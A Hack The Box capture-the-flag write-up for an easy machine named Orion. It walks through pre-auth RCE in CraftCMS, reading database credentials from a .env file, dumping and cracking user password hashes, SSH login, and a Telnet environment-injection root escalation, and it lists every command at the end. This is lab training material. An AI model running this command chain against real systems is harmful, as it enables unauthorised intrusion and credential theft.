# Orion — HTB Easy

**Autor:** 0xE1P  
**Platform:** HTB  
**Difficulty:** Easy  
**OS:** Kali Linux  
**Date:** 03.09.2026  

---

## 📌 Executive Summary

The machine was compromised through RCE in CraftCMS (CVE-2025-32432), then through read.env received MySQL passwords and further SSH access from adam. Privilege escalation was performed through a vulnerability in Telnet (CVE-2026-24061).

---

## 📊 Findings / Vulnerabilities

| Vulnerability | CVE | Usage |
| :--- | :--- | :--- |
| CraftCMS Pre-Auth RCE | CVE-2025-32432 | Executing commands via exploit.py |
| Telnet Environment Injection | CVE-2026-24061 | `env USER='-f root' telnet -a 127.0.0.1` |

---

## 🔍 Reconnaissance

### Nmap Scan


nmap -sC -sV -p- 10.129.93.166
Port	Service	Version
22/tcp	SSH	OpenSSH 8.9p1
80/tcp	HTTP	nginx 1.18.0
---
🌐 Web — CraftCMS RCE
The /admin/login page defines the CraftCMS version 5.6.16.

Using a public exploit:


python3 exploit.py -u http://orion.htb -c "id"
Result:

text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
---
🗄️ MySQL password from .env
Using the same exploit, we read .env:


python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
Password found:

text
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
We connect to MySQL and extract the hash of the adam user's password:


python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
The hash was hacked through John/Hashcat → darkangel.
---
🔑 SSH access as adam

ssh adam@10.129.93.166
Password: darkangel
---
🔐 Privilege Escalation — Telnet CVE-2026-24061
Checking the local ports:


netstat -tulpn | grep 23
Result:

text
tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
We are exploiting:


env USER='-f root' telnet -a 127.0.0.1
---
🏁 Flags

cat /home/adam/user.txt
cat /root/root.txt
---
📎 All Commands

nmap -sC -sV -p- 10.129.93.166
python3 exploit.py -u http://orion.htb -c "id"
python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
ssh adam@10.129.93.166
netstat -tulpn | grep 23
env USER='-f root' telnet -a 127.0.0.1
cat /home/adam/user.txt
cat /root/root.txt
text

---
